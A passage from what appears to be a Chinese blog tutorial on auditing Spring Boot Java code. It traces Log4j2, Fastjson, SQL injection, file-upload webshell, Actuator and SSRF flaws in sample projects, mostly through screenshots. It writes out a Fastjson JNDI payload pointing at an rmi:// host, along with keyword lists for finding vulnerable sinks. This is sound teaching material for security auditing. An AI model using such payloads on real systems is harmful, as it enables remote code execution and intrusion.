class="number">.3</span>&lt;/version&gt;</span><br><span class="line">            &lt;configuration&gt;</span><br><span class="line">                &lt;autoUpdate&gt;<span class="literal">true</span>&lt;/autoUpdate&gt;</span><br><span class="line">                &lt;nvdApiKey&gt;6d88f39a-aa0a-<span class="number">4312</span>-xxxx-xxxxxxxxxxx&lt;/nvdApiKey&gt;</span><br><span class="line">            &lt;/configuration&gt;</span><br><span class="line">            &lt;executions&gt;</span><br><span class="line">                &lt;execution&gt;</span><br><span class="line">                    &lt;goals&gt;</span><br><span class="line">                        &lt;goal&gt;check&lt;/goal&gt;</span><br><span class="line">                    &lt;/goals&gt;</span><br><span class="line">                &lt;/execution&gt;</span><br><span class="line">            &lt;/executions&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br></pre></td></tr></table></figure><p>​更多配置参数详解官方文档： <code>https://jeremylong.github.io/DependencyCheck/dependency-check-cli/arguments.html</code></p><p>​然后在Maven模块中点击check即可</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012174747869.png" alt="image-20241012174747869"></p><p>​运行成功后，会在target 目录下产生<code>dependency-check-report.html </code></p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012174915573.png" alt="image-20241012174915573"></p><p>输出文档非常全面</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012175010727.png" alt="image-20241012175018262"></p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241012175110192.png" alt="image-20241012175110192"></p><p>一个简单的例子:</p><p>​ <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014104456670.png" alt="image-20241014104456670"></p><p>​可以看到Log4j2版本为2.10.0，此版本存在远程代码执行漏洞(CVE-2021-44228)</p><p>​全局搜索关键字<code>logger.info</code>或<code>logger.error</code>，只是有的项目用前者，有的项目用后者，这两个本质是一样的，这都可以触发漏洞的，不过是记录信息不一样</p><p>​这个项目中是用的<code>logger.info</code></p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014113654900.png" alt="image-20241014113840129"></p><p>​找到拼接变量参数的地方，并确认哪些参数是可控的</p><p>​经过测试发现多出可用，这里随机演示一个</p><p>​ <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014165950492.png" alt="image-20241014165950492"></p><p>  向上追踪orderBy，发现是一个排序的字段</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/Users\iqq77\AppData\Roaming\Typora\typora-user-images\image-20241014170040274.png" alt="image-20241014170040274"></p><p>​根据注释和映射路径，我们移步到功能点处测试验证</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014170209422.png" alt="image-20241014170209422"></p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014170236989.png" alt="image-20241014170236989"></p><p>​留意url编码<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014170343462.png" alt="image-20241014170442218"></p><p>​成功</p><p>关于第一点，总结pom审计大概流程</p><p>​1、确认版本有无漏洞</p><p>​2、找到漏洞关键函数|有些依赖的漏洞可以直接利用</p><p>​3、确认参数是否可控</p><p>第二点，<strong>由于笔者水平有限，并不具备挖新链的能力，所以主要体现在漏洞利用上面，为了不误导大家，我举例说明</strong></p><p>比如Fastjson的情况，如果想在 Fastjson 反序列化漏洞中利用某条特定的利用链(执行命令)，而该利用链所依赖的类和方法在pom中不存在，那么就无法成功利用该条链进行攻击，当然shiro和weblogic的反序列化也是如此</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014154327370.png" alt="image-20241014154327370"></p><p>可以看到是1.2.58的fastjson</p><p> 确认到使用的fastjson版本存在漏洞，搜索关键字<code>JSON.parse</code>和<code>JSON.parseObject</code></p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155113393.png" alt="image-20241014155113393"></p><p>可以看到在152行这里使用<code>JSON.parseObject()</code>方法反序列化了<code>propertyJson</code>参数</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155200173.png" alt="image-20241014155200173"></p><p>向上追踪<code>propertyJson</code>参数</p><p>发现来自于添加信息产品的产品属性<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155300117.png" alt="image-20241014155300117"></p><p>去功能点出利用</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155519998.png" alt="image-20241014155519998"></p><p>dnslog探测</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155647948.png" alt="image-20241014155647948"></p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014155713362.png" alt="image-20241014155713362"></p><p><code>java.net.Inet4Address</code>是JDK 自带的类，因此不需要依赖额外的库或类，但也只能发送网络请求 证明此处存在fastjson反序列化漏洞。如果想要执行命令呢？直接讲利用</p><p>拿这个来验证<code>&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;rmi://192.168.16.126:1099/whoopsunix&quot;&#125;</code></p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014160641526.png" alt="image-20241014160641526"> 这里也给出了提示，调试过fastjson的应该也都知道，就是没有这个类</p><p>需要在pom中加入依赖</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014160839580.png" alt="image-20241014160839580"></p><p>再次验证</p><p>  <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014161159168.png" alt="image-20241014161159168"></p><p>还是不行是因为没有开启AutoType</p><p>初始化处加入<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014161255169.png" alt="image-20241014161255169"></p><p>此时就成功了</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014161329200.png" alt="image-20241014161329200"></p><p>上面这个项目中，笔者只是举例来证明第二点，通过手动修改代码来 RCE肯定是不行的。在一些SRC、众测或者甲方的项目中，通过网络请求验证存在Fastjson反序列化漏洞，评分是很低的，往往还需要提供完整的利用链做到RCE才能算有效高危</p><p> 到了这里，大家应该也都明白了，pom中关注依赖不仅是为了利用依赖的漏洞，对我们利用反序列化相关类也是很重要的</p><h5 id="正向审计"><a href="#正向审计" class="headerlink" title="正向审计"></a>正向审计</h5><p>​一、从一个功能点开始测试，就是我们平常渗透，外加代码层分析，最终来确认这个有没有漏洞，怎么去利用</p><p>​二、从Controller层的映射路径开始，一直追踪，代码到底做了什么，是否存在漏洞</p><p>​在这里，我发现了可以利用文件上传漏洞的功能点</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014163531369.png" alt="image-20241014163531369"></p><p>​映射路径定位到代码块</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014163628444.png" alt="image-20241014163628444"></p><p>​定位到映射路径</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014163800065.png" alt="image-20241014163800065"></p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014164011585.png" alt="image-20241014164011585"></p><p>​这里可以看到，对文件的处理只是获取到后缀，然后随机名+后缀，存储到了<code>res/images/item/adminProfilePicture/</code>这个目录中，</p><p>​发现在pom中存在jsp解析的依赖</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014164355171.png" alt="image-20241014164355171"></p><p>​这样就可以上传jsp马来getshell</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014164906606.png" alt="image-20241014164906606"></p><p>​成功</p><p>​遗憾的是，这种Springboot支持解析jsp的项目出现概率极低。Springboot先进的技术让前端几乎都是依靠模板渲染，或者前后端分离模式部署</p><p>​推荐大家去看我的这两篇文章，有一些比较详细的描写</p><p><a href="https://seven1an.github.io/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/">SpringBoot场景下不出网-内存中的正向代理 | Seven1an’s blog</a></p><p><a href="https://seven1an.github.io/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/">文件覆盖漏洞-crontab反弹shell细节问题 | Seven1an’s blog</a></p><p>​ 继续正向审计，大部分SpringBoot项目Dao层几乎都是Myabtis，下面这个项目也是</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014180952094.png" alt="image-20241014180952094"></p><p>​映入眼帘是搜索框</p><p>​搜索，抓包</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014181024437.png" alt="image-20241014181024437"></p><p>​映射路径定位到代码块<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014181253700.png" alt="image-20241014181253700"></p><p>​大概分析一下，</p><p>​控制器方法 <code>searchPage</code> 处理了 “&#x2F;search” 和 “&#x2F;search.html” 路径的 GET 请求，将请求的参数都封装到类型为Map的params的对象中，并且对指定的几个关键字做了单独处理</p><p>​检查 <code>params</code> 中是否有 <code>page</code> 参数。如果没有，默认设为 1</p><p>​给<code>limit</code>设置为了10</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014182034422.png" alt="image-20241014182034422"></p><p>​下面的if进行了一个分类筛选</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014182215607.png" alt="image-20241014182215607"></p><p>​如果存在并且非空，将其转换为 <code>Long</code> 类型的 <code>categoryId</code>。</p><p>​通过 <code>newBeeMallCategoryService.getCategoriesForSearch(categoryId)</code> 来获取该分类搜索信息，并保存到 <code>searchPageCategoryVO</code>。</p><p>​如果有数据，使用 <code>request.setAttribute()</code> 将分类数据添加到请求对象中</p><p>​接下来处理<code>orderBy</code>和<code>key</code></p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014182610152.png" alt="image-20241014182610152"></p><p>​检查<code>params</code> 中有无<code>orderBy</code>这个参数，验证非空后设置为请求属性</p><p>​检查<code>params</code> 中有无<code>keyword</code>这个参数，验证非空之后去掉空格，把参数中<code>keyword</code>的值传递给<code>keyword</code>，同时也将其作为请求属性和 <code>params</code> 中的值存储</p><p>​然后就是封装，调用service层的<code>newBeeMallGoodsService.searchNewBeeMallGoods</code>方法查询封装的对象，返回查询结果</p><p>​在这之间没有发现任何防护</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015143110444.png" alt="image-20241015143110444"></p><p>​没有过滤器实现，拦截器中也没有发现相关防护代码</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014185411742.png" alt="image-20241014185411742"></p><p>​看一下<code>newBeeMallGoodsService.searchNewBeeMallGoods</code>做了什么，可以看到方法中又调用了Dao层的<code>goodsMapper.findNewBeeMallGoodsListBySearch</code>来操作封装对象</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014185602363.png" alt="image-20241014185602363"></p><p>​定位到Dao层</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015142306401.png" alt="image-20241015142306401"></p><p>​继续跟进到 MyBatis 的 SQL 映射文件，查看对应的SQL语句发现进行了一个查询和排列的操作</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241014185653768.png" alt="image-20241014185653768"></p><p>​到了这里，就不言而喻了</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015143417580.png" alt="image-20241015143417580"></p><p>​${}拼接参数</p><p>​众所周知，<strong>动态拼接是核心是sql注入核心</strong>，也就是<code>keyword</code>参数存在注入</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015144553817.png" alt="image-20241015144553817"></p><p>​成功</p><p>​再来看这里</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015145853697.png" alt="image-20241015145853697"></p><p>​订单号这一串是否存在注入？</p><p>​映射路径定位到代码块</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015150037208.png" alt="image-20241015150037208"></p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015150102666.png" alt="image-20241015150102666"></p><p>​一直追踪到MyBatis 的 SQL 映射文件</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015150224555.png" alt="image-20241015150224555"></p><p>​ 这里使用了<code>#&#123;&#125;</code> 作为参数的占位符，也就是预编译机制，所以不存在SQL注入</p><p>篇幅原因三个简单的例子，希望各位可以理解正向审计的流程，从功能点入手再结合代码分析。这种方法对漏洞的发现效率是非常低的，对我来说往往是功能点太多了耗时耗力，有的忙活调试大半天发现无法利用！这样的话我们就需要逆向追踪这种挖掘路线</p><h5 id="逆向追踪"><a href="#逆向追踪" class="headerlink" title="逆向追踪"></a>逆向追踪</h5><p>​大家可以<strong>回顾到本文的POM目录</strong>，我举例说了log4j2和fastjson两种漏洞的利用，从漏洞点开始，特定的方法、关键字的发现，追踪到Controller层，看看是不是用户输入的(参数可控)。为什么不用正则？因为这在文章后期的工具中有更好的实现！就不要手工来折磨自己了</p><p>​第一个例子：</p><p>​因为是Mybatis项目，所以全局搜索xml文件中的$ 来挖一个SQL注入，需要从Dao层追踪到Controller层</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015191437614.png" alt="image-20241015191437614"></p><p>​跟进<code>$&#123;goodsName&#125;</code></p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015191624570.png" alt="image-20241015191624570"></p><p>​确认这个参数是从哪里过来的，它的值能不能在功能点处控制</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015191807543.png" alt="image-20241015191807543"></p><p>​进入Service层的实现类<code>NewBeeMallGoodsServiceImpl.java</code>，发现被<code>getNewBeeMallGoodsPage</code>方法调用</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015192118844.png" alt="image-20241015192118844"></p><p>​跟进查看谁调用了<code>getNewBeeMallGoodsPage</code>方法</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015192244028.png" alt="image-20241015192244028"></p><p>​并没有发现拦截过滤的防护代码，此时只需要找到前端触发映射的功能点，传递名为<code>goodsName</code>的参数附带SQL语句即可</p><p>​这里会出现一个问题，如何去找到功能点呢？</p><p>​我的思路：</p><ol><li><p>阅读注和释开发文档</p></li><li><p>拼接触发url，返回结果推断</p></li><li><p>触发的变量，抓包搜索</p></li><li><p>分析代码，直接构造请求</p></li><li><p>前端使劲找</p><p>这里使用第4种，考虑到路径前缀的情况，先从Endpoints看下完整映射路径</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015194434219.png" alt="image-20241015194434219"></p><p>加入cookie后构造payload</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015194757541.png" alt="image-20241015194757541"></p></li></ol><p>​根据代码处可以得知<code>page</code>和<code>limit</code>是必不可少的，再加上<code>goodName</code>参数即可</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015195105532.png" alt="image-20241015195105532"></p><p>​到这里就证明<code>goodsName</code>存在SQL注入漏洞</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241015200003930.png" alt="image-20241015200003930"></p><p>​第二个例子：</p><p>​ pom中发现引用了Spring Security依赖</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016135531241.png" alt="image-20241016135531241"></p><p>​很多SpringBoot都会引入Spring Security来做安全访问管理，在Spring Security中，我们可以通过如下几个关键字方法来定位代码，帮助挖掘<strong>未授权访问漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">authorizeRequests()</span><br><span class="line"></span><br><span class="line">formLogin()</span><br><span class="line"></span><br><span class="line">userDetailsService()</span><br><span class="line"></span><br><span class="line">ignoring()</span><br><span class="line"></span><br><span class="line">HttpSecurity</span><br><span class="line"></span><br><span class="line">permitAll()</span><br></pre></td></tr></table></figure><p>​通过搜索<code>ignoring</code>发现了无需验证就可以访问的地方</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016144813315.png" alt="image-20241016144813315"></p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016144827832.png" alt="image-20241016144827832"></p><p>​这不就有了几个无需登录鉴权就可以访问的地方吗，还是非常多的，直接访问危害最大的<code>/actuator/</code>看下</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016145023661.png" alt="image-20241016145023661"></p><p>​这里可以利用的点就非常多了：env星号解密、env加refresh进行getshell、heapdump分析获取敏感信息</p><p>​在application.yml中，可以看到也是开启了heapdump，这个默认是关闭的</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016145726644.png" alt="image-20241016145726644"></p><p>​那么就可以利用这个漏洞，危害是巨大的</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016145837023.png" alt="image-20241016145837023"></p><p>​最后一个案例：</p><p>​这次挖一下有没有SSRF漏洞，SSRF出现在网络请求的地方，如下是一些网络请求实现的关键字，通过关键字快速定位是否使用了该依赖以及相关HTTP请求方法，具体逻辑还需根据实际代码分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">HttpRequest.get</span><br><span class="line">HttpRequest.post</span><br><span class="line">Jsoup.connect</span><br><span class="line">getForObject</span><br><span class="line">RestTemplate</span><br><span class="line">postForObject</span><br><span class="line">httpclient</span><br><span class="line">execute</span><br><span class="line">HttpClients.createDefault</span><br><span class="line">httpasyncclient</span><br><span class="line">HttpAsyncClients.createDefault</span><br><span class="line">java.net.URLConnection</span><br><span class="line">openConnection</span><br><span class="line">java.net.HttpURLConnection</span><br><span class="line">openStream</span><br><span class="line">Socket</span><br><span class="line">java.net.Socket</span><br><span class="line">okhttp</span><br><span class="line">OkHttpClient</span><br><span class="line">newCall</span><br><span class="line">ImageIO.read</span><br><span class="line">javax.imageio.ImageIO</span><br><span class="line">HttpRequest.get</span><br><span class="line">jsoup</span><br><span class="line">Jsoup.connect</span><br><span class="line">RestTemplate</span><br><span class="line">org.springframework.web.client.RestTemplate</span><br></pre></td></tr></table></figure><p>​全局搜索一些，主要还是结合依赖和目录文件看作者的开发习惯命名，但命名几乎都差不多少</p><p>​搜索<code>newCall</code>，看到有<code>newCall(request).execute()</code>，它是 OkHttp 库中的方法调用，用于发起一个 HTTP 请求并同步地获取响应</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016180729443.png" alt="image-20241016180729443"></p><p>​进入到<code>SysbaseSupport.java</code>中分析，发现这是一个名为<code>upload</code>的方法</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016181143276.png" alt="image-20241016181143276"></p><p>​在这个方法中，接收了两个参数，接收一个 File对象和一个上传的 URL，着重观察uploadUrl，很多情况下url都是我们可控的，可以发现它被添加到了请求中，然后通过<code>OkHttpUtils.useHeaders</code>构建为了最终请求，并且通过<code>newCall</code>发送了出去，这里可以肯定是，如果可以控制uploadUrl这个参数的值，那么就存在SSRF漏洞，在这其中也没有发现过滤的相关防护代码</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016183050389.png" alt="image-20241016183050389"></p><p>​现在去查看哪里调用过upload，怎么去传递uploadUrl参数</p><p>​查找之后发现一处调用</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016183313220.png" alt="image-20241016183313220"></p><p>​这仅有的一处结果把uploadUrl硬编码写好了，这我们就无法从前端控制，故不存在漏洞</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016183440066.png" alt="image-20241016183440066"></p><p>​此处不存在，我们换下一个，来到get方法</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016183650025.png" alt="image-20241016183650025"></p><p>​这里还是一样的套路，再去找哪些地方调用了get方法</p><p>​<img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016184007338.png" alt="image-20241016184007338"></p><p>​一共有四处调用，前两处是方法重载调用的不关注，我们来到第二处的第一个<code>FileDownloader.java</code>的<code>readRawText</code>方法，这里可以看到，GET请求<code>read-raw</code>这个映射路径进行调用，从请求中获取到<code>url</code>赋值给filePath，获取请求中的 <code>charset</code> ，如果请求中没有此参数，则使用默认字符集 <code>AppUtils.UTF8</code>赋值给charset，以及<code>cut</code>参数的获取与赋值</p><p><img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016184927796.png" alt="image-20241017132505631"></p><p>​接着进入了一个if判断，跟进<code>isExternalUrl</code>方法得知做了url格式验证，可以看到如果filePath也就是传过来的url，既不是字符串也不是以<code>http://</code>或<code>https://</code>开头就返回false</p><p> <img src="/2024/10/11/%E5%85%AC%E5%BC%8F%E5%8C%96Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SpringBoot/img/image-20241016185110655.png" alt="image-20241016185110655"></p><p>​然后接着调用get方法，到了get里面也就执行了请求</p><p><img 